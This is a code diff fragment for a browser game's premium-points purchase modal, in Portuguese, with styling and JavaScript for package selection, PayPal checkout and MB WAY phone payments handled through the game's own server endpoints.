+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.85);
+    }
+
+    .modal-content-premium {
+        position: relative;
+        width: 95%;
+        max-width: 1020px;
+        max-height: 82vh !important;
+        overflow-y: auto !important;
+        background: linear-gradient(135deg, #4A1810 0%, #2C1810 100%);
+        border: 4px solid #8B4513;
+        border-radius: 12px;
+        box-shadow: 0 10px 50px rgba(0, 0, 0, 0.7);
+    }
+
+    .modal-close-premium {
+        position: absolute;
+        top: 10px;
+        right: 15px;
+        background: rgba(0, 0, 0, 0.5);
+        border: 2px solid #8B4513;
+        font-size: 32px;
+        color: #F4E4BC;
+        cursor: pointer;
+        z-index: 1;
+        width: 45px;
+        height: 45px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 50%;
+        transition: all 0.3s;
+    }
+
+    .modal-close-premium:hover {
+        background: rgba(255, 0, 0, 0.3);
+        transform: rotate(90deg);
+        border-color: #ff0000;
+    }
+
+    .modal-header-premium {
+        padding: 12px 25px;
+        background: linear-gradient(to bottom, rgba(139, 69, 19, 0.4), transparent);
+        border-bottom: 3px solid #8B4513;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .modal-header-premium h2 {
+        margin: 0;
+        color: #F4E4BC;
+        font-size: 26px;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+    }
+
+    .modal-body-premium {
+        padding: 20px 30px;
+    }
+
+    .modal-packages-premium {
+        display: grid;
+        grid-template-columns: repeat(5, 1fr);
+        gap: 12px;
+        margin-bottom: 15px;
+    }
+
+    .modal-package-premium {
+        background: linear-gradient(135deg, #8B0000 0%, #4A0000 100%);
+        border: 3px solid #DAA520;
+        border-radius: 8px;
+        padding: 8px 5px;
+        text-align: center;
+        cursor: pointer;
+        transition: all 0.3s;
+        position: relative;
+    }
+
+    .modal-package-premium:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 8px 20px rgba(218, 165, 32, 0.5);
+        border-color: #FFD700;
+    }
+
+    .modal-package-premium.popular {
+        background: linear-gradient(135deg, #2D5016 0%, #1A3010 100%);
+    }
+
+    .modal-package-bonus-premium {
+        position: absolute;
+        top: -12px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #27ae60;
+        color: white;
+        padding: 4px 12px;
+        border-radius: 12px;
+        font-size: 11px;
+        font-weight: bold;
+        white-space: nowrap;
+    }
+
+    .modal-package-points-premium {
+        font-size: 24px;
+        font-weight: bold;
+        color: white;
+        margin: 5px 0;
+        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+    }
+
+    .modal-package-label-premium {
+        font-size: 11px;
+        color: #F4E4BC;
+        margin-bottom: 5px;
+    }
+
+    .modal-package-image-premium {
+        margin: 5px 0;
+        min-height: 40px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .modal-package-image-premium img {
+        max-width: 45px;
+        height: auto;
+    }
+
+    .modal-package-badge-premium {
+        background: #2563eb;
+        color: white;
+        padding: 3px 8px;
+        border-radius: 4px;
+        font-size: 10px;
+        font-weight: bold;
+        margin: 5px 0;
+    }
+
+    .modal-package-price-premium {
+        font-size: 16px;
+        font-weight: bold;
+        color: #DAA520;
+        background: rgba(0, 0, 0, 0.4);
+        padding: 5px 8px;
+        border-radius: 4px;
+        margin-top: 5px;
+    }
+
+    .modal-decoration-premium {
+        margin: 0;
+        border-radius: 8px;
+        overflow: hidden;
+        border: 2px solid #8B4513;
+    }
+
+    .modal-decoration-premium img {
+        width: 100%;
+        height: 110px;
+        object-fit: cover;
+    }
+
+    .modal-payment-premium {
+        background: rgba(139, 69, 19, 0.3);
+        padding: 20px;
+        border-radius: 8px;
+        border: 2px solid #8B4513;
+    }
+
+    .modal-payment-premium label {
+        display: block;
+        margin-bottom: 12px;
+        font-weight: bold;
+        color: #F4E4BC;
+        font-size: 14px;
+    }
+
+    .payment-row-premium {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 15px;
+    }
+
+    .payment-select-premium {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        background: #2C1810;
+        border: 2px solid #8B4513;
+        border-radius: 4px;
+        padding: 0 15px;
+    }
+
+    .payment-select-premium select {
+        flex: 1;
+        padding: 12px 10px;
+        border: none;
+        background: transparent;
+        color: #F4E4BC;
+        font-size: 14px;
+        cursor: pointer;
+    }
+
+    .payment-dropdown-premium {
+        padding: 12px 20px;
+        background: #DAA520;
+        border: none;
+        border-radius: 4px;
+        color: #2C1810;
+        cursor: pointer;
+        font-weight: bold;
+        transition: all 0.3s;
+    }
+
+    .payment-dropdown-premium:hover {
+        background: #FFD700;
+    }
+
+    .payment-save-premium {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    .payment-save-premium label {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        cursor: pointer;
+        margin: 0;
+    }
+
+    .payment-save-premium input[type="checkbox"] {
+        width: 20px;
+        height: 20px;
+        cursor: pointer;
+    }
+
+    .payment-save-premium span {
+        color: #F4E4BC;
+        font-weight: normal;
+    }
+
+    .payment-help-premium {
+        width: 24px;
+        height: 24px;
+        border-radius: 50%;
+        background: #DAA520;
+        border: none;
+        color: #2C1810;
+        font-weight: bold;
+        cursor: help;
+        transition: all 0.3s;
+    }
+
+    .payment-help-premium:hover {
+        background: #FFD700;
+        transform: scale(1.1);
+    }
+
+    .modal-footer-premium {
+        margin-top: 10px;
+        padding-top: 15px;
+        border-top: 2px solid #8B4513;
+        text-align: center;
+    }
+
+    .modal-footer-premium a {
+        color: #DAA520;
+        text-decoration: none;
+        font-size: 12px;
+        transition: color 0.3s;
+    }
+
+    .modal-footer-premium a:hover {
+        color: #FFD700;
+        text-decoration: underline;
+    }
+
+    .modal-footer-premium span {
+        color: #666;
+        margin: 0 8px;
+    }
+
+    .footer-note-premium {
+        margin-top: 12px;
+        font-size: 11px;
+        color: #999;
+    }
+
+    @media (max-width: 1024px) {
+        .modal-packages-premium {
+            grid-template-columns: repeat(3, 1fr);
+        }
+    }
+
+    @media (max-width: 768px) {
+        .modal-packages-premium {
+            grid-template-columns: repeat(2, 1fr);
+        }
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
+
+<!-- PayPal JS SDK — loaded dynamically with Client ID from server config -->
+<script>
+window.paypalConfigured = false;
+(function() {
+    fetch('game.php?village=<?= $village['id'] ?>&screen=paypal&action=config&t=' + new Date().getTime())
+        .then(r => r.json())
+        .then(cfg => {
+            if (!cfg.client_id || cfg.client_id.startsWith('COLOCA')) {
+                console.warn('PayPal: credenciais não configuradas em app/Config/paypal.php');
+                window.paypalConfigured = false;
+                return;
+            }
+            window.paypalConfigured = true;
+            const script = document.createElement('script');
+            script.src = 'https://www.paypal.com/sdk/js?client-id=' + encodeURIComponent(cfg.client_id) + '&currency=EUR';
+            document.head.appendChild(script);
+        })
+        .catch(() => {
+            console.warn('PayPal SDK: falha ao obter client_id');
+            window.paypalConfigured = false;
+        });
+})();
+</script>
+
+<script>
+    let selectedPackage = null;
+
+    function openPremiumModal() {
+        document.getElementById('premiumPurchaseModal').style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+        selectedPackage = null; // Reset selection
+        updatePackageSelection();
+        clearPremiumWarning();
+    }
+
+    function closePremiumModal() {
+        document.getElementById('premiumPurchaseModal').style.display = 'none';
+        document.body.style.overflow = 'auto';
+        if (typeof resetMbwayUI === 'function') {
+            resetMbwayUI();
+        }
+        clearPremiumWarning();
+    }
+
+    function selectPackage(index) {
+        selectedPackage = index;
+        updatePackageSelection();
+        clearPremiumWarning();
+    }
+
+    function updatePackageSelection() {
+        const packages = document.querySelectorAll('.modal-package-premium');
+        packages.forEach((pkg, index) => {
+            if (index === selectedPackage) {
+                pkg.style.borderColor = '#FFD700';
+                pkg.style.boxShadow = '0 0 20px rgba(255, 215, 0, 0.6)';
+                pkg.style.transform = 'scale(1.05)';
+            } else {
+                pkg.style.borderColor = '#DAA520';
+                pkg.style.boxShadow = 'none';
+                pkg.style.transform = 'scale(1)';
+            }
+        });
+    }
+
+    function processPurchase() {
+        clearPremiumWarning();
+
+        if (selectedPackage === null) {
+            showPremiumWarning('Por favor, seleciona um pacote primeiro!');
+            return;
+        }
+
+        const method = document.getElementById('paymentMethod').value;
+        if (method === 'paypal') {
+            const paypalContainer = document.getElementById('paypal-button-container');
+            paypalContainer.style.display = 'block';
+            document.getElementById('mbway-container').style.display = 'none';
+
+            // Clear previous render if any
+            paypalContainer.innerHTML = '';
+
+            if (!window.paypalConfigured) {
+                paypalContainer.innerHTML = `
+                    <div style="color: #ff4d4d; font-weight: bold; margin-top: 10px; background: rgba(44, 24, 16, 0.95); padding: 15px; border-radius: 6px; border: 1.5px solid #ff4d4d; text-align: left; font-size: 13px; line-height: 1.6; max-width: 100%; box-sizing: border-box;">
+                        ⚠️ <strong style="color: #ff4d4d; font-size: 14px;">Erro de Configuração do PayPal:</strong><br>
+                        O SDK do PayPal não pôde ser carregado. Isto deve-se ao facto de as credenciais no ficheiro 
+                        <code style="background: rgba(255,255,255,0.15); padding: 2px 5px; border-radius: 3px; font-family: monospace; color: #fff;">app/Config/paypal.php</code> 
+                        ainda conterem os valores padrão de exemplo (como <code style="background: rgba(255,255,255,0.15); padding: 2px 5px; border-radius: 3px; font-family: monospace; color: #fff;">COLOCA_AQUI_...</code>).<br><br>
+                        <strong>Como resolver:</strong>
+                        <ol style="margin-top: 5px; padding-left: 20px; color: #F4E4BC;">
+                            <li>Abre o ficheiro <code style="background: rgba(255,255,255,0.15); padding: 2px 5px; border-radius: 3px; font-family: monospace; color: #fff;">app/Config/paypal.php</code> no teu editor.</li>
+                            <li>Substitui os valores do <code style="background: rgba(255,255,255,0.15); padding: 2px 5px; border-radius: 3px; font-family: monospace; color: #fff;">sandbox_client_id</code> e <code style="background: rgba(255,255,255,0.15); padding: 2px 5px; border-radius: 3px; font-family: monospace; color: #fff;">sandbox_client_secret</code> pelas tuas credenciais do Sandbox.</li>
+                            <li><strong>Garante que guardas o ficheiro</strong> após a edição.</li>
+                            <li>Atualiza a página (F5) e tenta novamente.</li>
+                        </ol>
+                    </div>`;
+                return;
+            }
+
+            if (typeof paypal === 'undefined') {
+                paypalContainer.innerHTML = `
+                    <div style="color: #ffaa00; font-weight: bold; margin-top: 10px; background: rgba(44, 24, 16, 0.95); padding: 15px; border-radius: 6px; border: 1.5px solid #ffaa00; text-align: left; font-size: 13px; line-height: 1.6; max-width: 100%; box-sizing: border-box;">
+                        ⏳ <strong style="color: #ffaa00; font-size: 14px;">A carregar o PayPal...</strong><br>
+                        O script de pagamento está a ser descarregado dos servidores seguros do PayPal. 
+                        Por favor, aguarda uns segundos e clica novamente em "Pagar com PayPal".<br><br>
+                        <small style="color: #aaa;">Se este aviso persistir por mais de 10 segundos, verifica a consola de desenvolvimento (F12) e a tua ligação à Internet.</small>
+                    </div>`;
+                return;
+            }
+
+            // Hide the checkout button and show PayPal buttons
+            document.querySelector('.payment-dropdown-premium').style.display = 'none';
+
+            paypal.Buttons({
+                style: {
+                    layout: 'vertical',
+                    color:  'gold',
+                    shape:  'rect',
+                    label:  'pay'
+                },
+
+                // Step 1: Create order on server
+                createOrder: function() {
+                    return fetch('game.php?village=<?= $village['id'] ?>&screen=paypal', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `action=create_order&package=${selectedPackage}`
+                    })
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data.error) throw new Error(data.error);
+                        return data.id;
+                    });
+                },
+
+                // Step 2: Capture after user approves on PayPal
+                onApprove: function(data) {
+                    return fetch('game.php?village=<?= $village['id'] ?>&screen=paypal', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: `action=capture_order&order_id=${data.orderID}`
+                    })
+                    .then(r => r.json())
+                    .then(result => {
+                        if (result.success) {
+                            closePremiumModal();
+                            alert('✅ ' + result.message);
+                            window.location.reload();
+                        } else {
+                            alert('❌ Erro: ' + (result.error || 'Pagamento não confirmado.'));
+                        }
+                    });
+                },
+
+                onCancel: function() {
+                    // Restore button
+                    document.querySelector('.payment-dropdown-premium').style.display = 'inline-block';
+                    paypalContainer.style.display = 'none';
+                },
+
+                onError: function(err) {
+                    console.error('PayPal error:', err);
+                    alert('Erro no PayPal. Por favor, tenta novamente.');
+                    document.querySelector('.payment-dropdown-premium').style.display = 'inline-block';
+                    paypalContainer.style.display = 'none';
+                }
+            }).render('#paypal-button-container');
+        } else if (method === 'mbway') {
+            document.getElementById('paypal-button-container').style.display = 'none';
+            document.querySelector('.payment-dropdown-premium').style.display = 'none';
+
+            const mbwayContainer = document.getElementById('mbway-container');
+            mbwayContainer.style.display = 'block';
+
+            // Reset to step 1
+            document.getElementById('mbway-step-input').style.display = 'block';
+            document.getElementById('mbway-step-waiting').style.display = 'none';
+            document.getElementById('mbway-phone').value = '';
+            document.getElementById('mbway-input-error').style.display = 'none';
+        }
+    }
+
+    let currentMbwayOrderId = null;
+
+    function changePaymentMethod(method) {
+        const paypalBtn = document.querySelector('.payment-dropdown-premium');
+        const paypalContainer = document.getElementById('paypal-button-container');
+        const mbwayContainer = document.getElementById('mbway-container');
+        const methodIcon = document.getElementById('paymentMethodIcon');
+
+        // Reset containers
+        paypalContainer.style.display = 'none';
+        mbwayContainer.style.display = 'none';
+
+        if (method === 'paypal') {
+            methodIcon.src = '/graphic/new/premium/paypal.png';
+            paypalBtn.style.display = 'inline-block';
+            paypalBtn.textContent = 'Pagar com PayPal';
+        } else if (method === 'mbway') {
+            methodIcon.src = '/graphic/new/premium/mbway.png';
+            paypalBtn.style.display = 'inline-block';
+            paypalBtn.textContent = 'Pagar com MB WAY';
+        }
+    }
+
+    function startMbwayPayment() {
+        const phone = document.getElementById('mbway-phone').value.trim();
+        const errorDiv = document.getElementById('mbway-input-error');
+        errorDiv.style.display = 'none';
+
+        if (!/^9[0-9]{8}$/.test(phone)) {
+            errorDiv.textContent = '⚠️ Número de telemóvel inválido. Deve ter 9 dígitos e começar por 9.';
+            errorDiv.style.display = 'block';
+            return;
+        }
+
+        // Show loading state
+        const payBtn = document.querySelector('#mbway-step-input button');
+        const originalText = payBtn.textContent;
+        payBtn.disabled = true;
+        payBtn.textContent = 'A processar...';
+
+        fetch('game.php?village=<?= $village['id'] ?>&screen=paypal', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `action=create_mbway_order&package=${selectedPackage}&phone=${phone}`
+        })
+        .then(r => r.json())
+        .then(data => {
+            payBtn.disabled = false;
+            payBtn.textContent = originalText;
+
+            if (data.error) {
+                errorDiv.textContent = '⚠️ ' + data.error;
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            currentMbwayOrderId = data.id;
+
+            // Transition to Step 2: Waiting screen
+            document.getElementById('mbway-step-input').style.display = 'none';
+            document.getElementById('mbway-step-waiting').style.display = 'block';
+            document.getElementById('mbway-waiting-phone').textContent = data.phone;
+            document.getElementById('mbway-waiting-amount').textContent = data.amount + ' €';
+        })
+        .catch(err => {
+            payBtn.disabled = false;
+            payBtn.textContent = originalText;
+            errorDiv.textContent = '⚠️ Erro ao comunicar com o servidor. Tenta novamente.';
+            errorDiv.style.display = 'block';
+            console.error('MB WAY error:', err);
+        });
+    }
+
+
+
+    function cancelMbwayPayment() {
+        if (!currentMbwayOrderId) {
+            resetMbwayUI();
+            return;
+        }
+
+        fetch('game.php?village=<?= $village['id'] ?>&screen=paypal', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `action=cancel_mbway_order&order_id=${currentMbwayOrderId}`
+        })
+        .then(() => {
+            resetMbwayUI();
+        })
+        .catch(() => {
+            resetMbwayUI();
+        });
+    }
+
+    function showPremiumWarning(msg) {
+        const warningDiv = document.getElementById('premium-warning-message');
+        const warningText = document.getElementById('premium-warning-text');
+        if (warningDiv && warningText) {
+            warningText.textContent = msg;
+            warningDiv.style.display = 'block';
+            warningDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+    }
+
+    function clearPremiumWarning() {
+        const warningDiv = document.getElementById('premium-warning-message');
+        if (warningDiv) {
+            warningDiv.style.display = 'none';
+        }
+    }
+
+    function showSavePaymentHelp(event) {
+        if (event) event.preventDefault();
+        const msg = "Esta opção permite guardar os seus dados de faturação no navegador para compras futuras, agilizando o checkout na próxima vez.";
+        if (typeof UI !== 'undefined' && typeof UI.InfoMessage === 'function') {
+            UI.InfoMessage(msg, 5000);
+        } else {
+            alert(msg);
+        }
+    }
+
+    function resetMbwayUI() {
+        currentMbwayOrderId = null;
+        document.getElementById('mbway-container').style.display = 'none';
+        document.querySelector('.payment-dropdown-premium').style.display = 'inline-block';
+    }
+
+        // Add click event to dropdown button
+        const dropdownBtn = document.querySelector('.payment-dropdown-premium');
+        if (dropdownBtn) {
+            dropdownBtn.addEventListener('click', function () {
+                processPurchase();
+            });
+        }
+
+    // Close modal when clicking outside
+    document.getElementById('purchaseModal')?.addEventListener('click', function (e) {
+        if (e.target === this) {
+            closePurchaseModal();
+        }
+    });
+
+    // Update cost display when duration changes
+    function updateCostDisplay(selectName, feature, costElementId) {
+        const select = document.querySelector(`select[name="${selectName}"]`);
+        const costElement = document.getElementById(costElementId);
+
+        if (select && costElement) {
+            select.addEventListener('change', function () {
+                const duration = parseInt(this.value);
+                const cost = calculateCost(feature, duration);
+                costElement.textContent = cost + ' pontos';
+            });
+        }
+    }
+
+    // Initialize cost displays for all features
+    document.addEventListener('DOMContentLoaded', function () {
+        updateCostDisplay('duration_manager', 'account_manager', 'cost_manager');
+        updateCostDisplay('duration_farm', 'farm_assistant', 'cost_farm');
+        updateCostDisplay('duration_wood', 'wood_production', 'cost_wood');
+        updateCostDisplay('duration_clay', 'clay_production', 'cost_clay');
+        updateCostDisplay('duration_iron', 'iron_production', 'cost_iron');
+    });
+    // Adicionar evento de clique aos pacotes e botões
+    document.addEventListener('keydown', function (e) {
+        if (e.key === 'Escape') {
+            closePremiumModal();
+        }
+    });
+
+    // Adicionar evento de clique aos pacotes e botões
+    document.addEventListener('DOMContentLoaded', function () {
+        // Add click event to packages
+        const packages = document.querySelectorAll('.modal-package-premium');
+        packages.forEach((pkg, index) => {
+            pkg.addEventListener('click', function () {
+                selectPackage(index);
+            });
+            pkg.style.cursor = 'pointer';
+        });
+
+        // Add click event to dropdown button
+        const dropdownBtn = document.querySelector('.payment-dropdown-premium');
+        if (dropdownBtn) {
+            dropdownBtn.addEventListener('click', function () {
+                processPurchase();
+            });
+        }
+
+        // Encontrar todos os botões de compra existentes e adicionar o evento
+        const buyButtons = document.querySelectorAll('.premium-package button, .premium-package');
+        buyButtons.forEach(button => {
+            button.addEventListener('click', function (e) {
+                if (e.target.tagName === 'BUTTON' || e.target.classList.contains('premium-package')) {
+                    openPremiumModal();
+                }
+            });
+        });
+    });
+</script>
+</content>
